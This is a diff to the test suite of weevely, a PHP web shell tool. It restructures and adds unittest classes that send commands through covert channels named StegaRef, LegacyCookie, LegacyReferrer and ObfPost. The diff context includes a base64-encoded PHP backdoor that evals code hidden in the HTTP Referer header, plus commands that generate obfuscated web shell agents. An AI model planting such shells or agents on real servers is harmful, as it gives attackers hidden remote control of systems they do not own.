@@ -25,6 +25,7 @@ dIVFRQX1JFRkVSRVInXSwkYSk7IGlmKHJlc2V0KCRhKT09J2FzJyAmJiBj\
 b3VudCgkYSk9PTkpIHsgZWNobyAnPGRhc2Q+JztldmFsKGJhc2U2NF9kZWN\
 vZGUoc3RyX3JlcGxhY2UoIiAiLCAiKyIsIGpvaW4oYXJyYXlfc2xpY2UoJGE\
 sY291bnQoJGEpLTMpKSkpKTtlY2hvICc8L2Rhc2Q+Jzt9')); ?>" > "$BASE_FOLDER/legacyreferrer.php"
+python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref.php"
 python ./weevely.py generate -agent stegaref_php_debug "$PWD" "$BASE_FOLDER/stegaref_php_debug.php"
 python ./weevely.py generate -agent legacycookie_php "$PWD" "$BASE_FOLDER/legacycookie_php.php"
 """.format(
@@ -40,13 +41,13 @@ def _get_google_ip():
     except Exception:
         pass
 
-class StegaRefChannel(BaseTest):
+class BaseStegaRefChannel(BaseTest):
 
     def setUp(self):
         self.channel = Channel(
             'StegaRef',
             {
-                'url' : self.url,
+                'url' : config.base_url + '/test_channels/stegaref.php',
                 'password' : self.password
             }
         )
@@ -67,7 +68,7 @@ class StegaRefChannel(BaseTest):
                 payload)
 
 
-class StegaRefChannelAdditionalHeaders(StegaRefChannel):
+class StegaRefChannelAdditionalHeaders(BaseStegaRefChannel):
 
     def test_additional_headers(self):
         self.channel.channel_loaded.additional_headers = [
@@ -120,7 +121,7 @@ class StegaRefChannelWrongCert(BaseTest):
 @unittest.skipIf(
     not config.test_stress_channels,
     "Test only default generator agent")
-class AgentDEFAULTObfuscatorDefault(StegaRefChannel):
+class StegaRefChannel(BaseStegaRefChannel):
 
     def test_1_100_requests(self):
         self._incremental_requests(1, 100, 1, 3)
@@ -211,13 +212,6 @@ class LegacyCookieChannel(BaseTest):
         except Exception as e:
             self.fail("LegacyCookie test_wrong_cert exception\n%s" % (str(e)))
 
-@unittest.skipIf(
-    not config.test_stress_channels,
-    "Test only default generator agent")
-class AgentDEBUGObfuscatorCLEARTEXT(AgentDEFAULTObfuscatorDefault):
-
-    url = config.base_url + '/test_channels/stegaref_php_debug.php'
-
 
 @unittest.skipIf(
     not config.test_stress_channels,
@@ -293,3 +287,45 @@ class LegacyReferrerChannel(BaseTest):
             channel.send('echo("1");')
         except Exception as e:
             self.fail("LegacyReferrer test_wrong_cert exception\n%s" % (str(e)))
+
+
+class ObfPostChannel(BaseTest):
+
+    def setUp(self):
+        self.channel = Channel(
+            'ObfPost',
+            {
+                'url' : self.url,
+                'password' : self.password
+            }
+        )
+
+    def _incremental_requests(
+            self,
+            size_start,
+            size_to,
+            step_rand_start,
+            step_rand_to):
+
+        for i in range(size_start, size_to, random.randint(step_rand_start, step_rand_to)):
+            payload = utils.strings.randstr(i)
+            self.assertEqual(
+                self.channel.send(
+                    'echo("%s");' %
+                    payload)[0],
+                payload)
+
+class AgentDEFAULTObfuscatorDefault(ObfPostChannel):
+
+    def test_1_100_requests(self):
+        self._incremental_requests(1, 100, 1, 3)
+
+    def test_100_1000_requests(self):
+        self._incremental_requests(100, 1000, 90, 300)
+
+    def test_1000_10000_requests(self):
+        self._incremental_requests(1000, 10000, 900, 3000)
+
+    def test_10000_50000_requests(self):
+        self._incremental_requests(10000, 50000, 9000, 30000)
+        
